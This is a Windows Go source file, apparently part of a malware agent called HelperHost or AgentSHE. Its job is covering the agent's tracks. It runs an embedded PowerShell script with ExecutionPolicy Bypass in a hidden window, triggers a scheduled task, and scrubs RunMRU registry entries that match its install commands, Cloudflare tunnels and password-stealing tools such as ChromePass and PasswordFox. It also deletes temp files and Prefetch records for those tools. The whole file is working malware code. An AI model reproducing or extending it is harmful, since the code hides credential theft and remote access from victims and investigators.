//go:build windows

package main

import (
	_ "embed"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed embed/restore-win-security.ps1
var restoreWinSecurityPS1 string

func restoreWindowsSecurity() {
	ps1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
	_ = os.WriteFile(ps1, []byte(restoreWinSecurityPS1), 0o644)

	_ = exec.Command("schtasks", "/Run", "/TN", "HelperHostWipeRestore").Run()
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", ps1)
	hideWindow(cmd)
	_ = cmd.Run()
}

func scrubRunMRU() {
	ps := `
$ErrorActionPreference='SilentlyContinue'
$mark='HelperHost|EdgeRelay|AgentSHE|agentshe|install-win|install\.ps1|lilygopro|AGENTSHE_|trycloudflare|ChromePass|PasswordFox|mailpv|mspass|netpass|\$Enroll=|\$BotBase=|irm .*install|Cleaner\.exe|HelperHostWipe|agentshe-bot'
$mru='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
if (-not (Test-Path $mru)) { return }
$props = Get-ItemProperty $mru
foreach ($p in $props.PSObject.Properties) {
  if ($p.Name -in @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider','MRUList')) { continue }
  $v = [string]$p.Value
  if ($v -match $mark) {
    Remove-ItemProperty -Path $mru -Name $p.Name -Force
  }
}
`
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	hideWindow(cmd)
	_ = cmd.Run()
}

func scrubTempInstallArtifacts() {
	tmp := os.TempDir()
	entries, err := os.ReadDir(tmp)
	if err != nil {
		return
	}
	for _, e := range entries {
		n := e.Name()
		low := strings.ToLower(n)
		if strings.HasPrefix(low, "helperhost-") ||
			strings.HasPrefix(low, "hh-") ||
			low == "hh-wipe.cmd" ||
			low == "hh-restore-security.ps1" {
			_ = os.RemoveAll(filepath.Join(tmp, n))
		}
	}
	prefetch := filepath.Join(os.Getenv("SystemRoot"), "Prefetch")
	if prefetchEntries, err := os.ReadDir(prefetch); err == nil {
		prefixes := []string{
			"HELPERHOST", "EDGERELAY", "CHROMEPASS", "WEBBROWSERPASSVIEW",
			"PASSWORDFOX", "MAILPV", "MSPASS", "NETPASS", "IEPV",
			"DIALUPASS", "PSTPASSWORD", "CLOUDFLARED",
		}
		for _, e := range prefetchEntries {
			n := strings.ToUpper(e.Name())
			for _, p := range prefixes {
				if strings.HasPrefix(n, p) {
					_ = os.Remove(filepath.Join(prefetch, e.Name()))
					break
				}
			}
		}
	}
}
